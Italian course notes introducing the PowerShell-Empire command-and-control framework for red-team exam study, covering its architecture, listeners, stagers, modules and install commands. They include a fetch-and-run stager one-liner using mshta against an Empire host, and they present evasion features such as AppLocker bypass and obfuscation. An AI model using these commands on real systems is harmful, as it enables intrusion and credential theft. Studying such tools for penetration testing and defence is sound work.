# 08 — Introduction to PowerShell-Empire (Command & Control)

> **Modulo:** Command & Control (C2) · **Video:** 8/11
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [08_Introduction to PowerShell-Empire.txt](08_Introduction to PowerShell-Empire.txt) · [08_Introduction to PowerShell-Empire.srt](08_Introduction to PowerShell-Empire.srt)

## Concetti chiave

- **PowerShell-Empire (Empire 4)** è un C2 / post-exploitation framework **pure PowerShell** (lato agent Windows), con architettura modulare server/client.
- Versione attualmente mantenuta da **BC Security**, riscritta in **Python 3** (la versione originale era Python 2 ed era stata archiviata nel 2019).
- Pacchetto ufficiale su **Kali Linux** come `powershell-empire`; GUI separata = `starkiller`.
- Agent supportati: **PowerShell (Windows, senza `powershell.exe`)**, **Python 3 (Linux/macOS)**, **C# (PE Windows)**.
- Architettura: **Empire server** (gestione e API) + **Empire client** (CLI o **Starkiller** GUI) → API REST su porta **1337**, Socket.IO su **5000**.
- Terminologia interna ricalca lo standard: **listener**, **stager**, **agent**, **module**.

## Spiegazione approfondita

### Cos'è Empire 4
> "Pure PowerShell C2 or post-exploitation framework built on cryptologically secure communications and a flexible architecture."

Caratteristiche distintive:
- Esegue agent PowerShell **senza `powershell.exe`** (usa System.Management.Automation runspace).
- Moduli rapidamente deployable: keylogger, Mimikatz, situational awareness, lateral movement, persistence.
- Comunicazioni cifrate, adatte ad evasion network.

### Storia rapida
- v1/v2: PowerShell Empire originale (Python 2, BC Security fork dopo archiviazione 2019).
- v3: merge tra Empire originale e Python Empire.
- **v4 (corrente)**: Python 3, attivamente mantenuta da BC Security e pacchettizzata da Kali.

### Funzionalità chiave
- **Centralized model** server-client, **multiplayer/multi-user**.
- Client CLI + GUI (**Starkiller**).
- Comunicazioni cifrate: HTTP, HTTPS, Malleable HTTP, **OneDrive**, **Dropbox**, **PHP** listeners.
- **400+ tools** in PowerShell, C#, Python.
- **Donut** integration per shellcode generation/injection.
- Modular plugin interface server-side, flexible module interface client-side.
- Obfuscation integrata: **ConfuserEx 2** + **Invoke-Obfuscation** per PowerShell.
- **In-memory .NET assembly execution**.
- **MITRE ATT&CK** mapping integrato.
- Roslyn compiler integrato per compilation C#.
- Install supportato su Docker, Kali, Ubuntu, Debian.

### Architettura (Empire 4)
- **Empire server** — gestisce stager, agent, moduli, listener. Espone REST API (1337) + Socket.IO (5000).
- **Empire client (CLI)** — `powershell-empire client`, si connette a server local/remoto via REST.
- **Starkiller (GUI)** — Electron + Vue.js, connessione via REST API.
- Server e client si avviano in terminali separati.

### Terminologia Empire
- **Listener**: processo lato server in ascolto di callback agent (es. `http`).
- **Stager**: codice/script/PE per stabilire il primo foothold (multi/launcher, hta, macro, bat, vbs...).
- **Agent**: runtime sul target che chiama il listener ed esegue task.
- **Module**: codice eseguito dall'agent per task specifici (enum, credential access, lateral movement...).

### Listeners più usati
| Listener | Note |
|---|---|
| `http` | Standard HTTP/HTTPS. Default. |
| `http_com` | HTTP via IE hidden COM object (legacy). |
| `http_foreign` | Inietta payload Empire da listener "estero". |
| `http_hop` | Redirector / hop — proxy verso un altro listener (nasconde IP originale). |
| `http_mapi` | Sfrutta Liniaal per controllo via Exchange server. |
| `dbx` | Dropbox — richiede token API, ottimo per **exfiltration**. |

### Stagers principali
- **bash** — script bash launcher.
- **launcher** — one-liner in scripting language (VBS, batch, ecc.).
- **macro** — macro Office (Word/Excel) per **initial access via phishing**.
- **shellcode** — Windows shellcode.
- **C# EXE** — PE C# stager.
- **DLL** — DLL stager.
- **HTA** — HTML Application, eseguibile via **`mshta.exe`** (presente nativamente in Windows). Molto usato dall'istruttore: stager one-liner HTA hostato su Empire, lanciato con `mshta http://<empire>/file.hta`.

### Moduli notevoli (Windows)
- **Mimikatz** (credential access).
- **Seatbelt**, **Rubeus**, **SharpSploit** (in-memory C#).
- **Certify** (AD Certificate abuse).
- **Process injection** moduli (assembly execution, BOF execution).

## Comandi & strumenti

```bash
# Install su Kali
sudo apt update
sudo apt install -y powershell-empire starkiller

# Avvio server (terminale 1)
sudo powershell-empire server

# Avvio client CLI (terminale 2)
powershell-empire client

# Avvio GUI
starkiller   # connect a localhost:1337
```

Porte default:
- **1337/TCP** — REST API
- **5000/TCP** — Socket.IO

## Esempi pratici

Demo concreta nel video successivo. In questo video solo presentazione del progetto, repo GitHub (BC Security/Empire), wiki ufficiale, e blog post Kali 2021 che annuncia il merge.

## Punti d'attenzione per l'esame eCPPT

- **Versione corrente**: Empire 4, mantenuta da **BC Security**, pacchetto Kali `powershell-empire`.
- **Server e client separati**: due processi distinti, REST API su **1337**.
- **Agent Windows pure PowerShell senza `powershell.exe`** → bypass restrizioni AppLocker/policy basate sull'eseguibile.
- **Terminologia Empire = standard C2**: listener, stager, agent, module.
- **HTA + `mshta.exe`** è il vettore preferito dell'istruttore per piazzare lo stager (LOLBAS).
- **Donut** = shellcode generator integrato.
- **Obfuscation built-in**: ConfuserEx2 (C#) + Invoke-Obfuscation (PowerShell).
- **In-memory execution** di .NET assembly via Roslyn = OPSEC fundamental.

## Collegamenti con altri video

- Precedente: [[07_The C2 Matrix - Choosing the Correct C2 Framework]] — perché abbiamo scelto Empire.
- Prossimo: [[09_ Red Team Ops with PowerShell-Empire]] — lab CLI pratico.
- GUI: [[010_Red Team Ops with Starkiller]]
- Terminologia: [[05_ C2 Framework Terminology]]
- Deployment / domain fronting: [[06_C2 Deployment & Operation]]
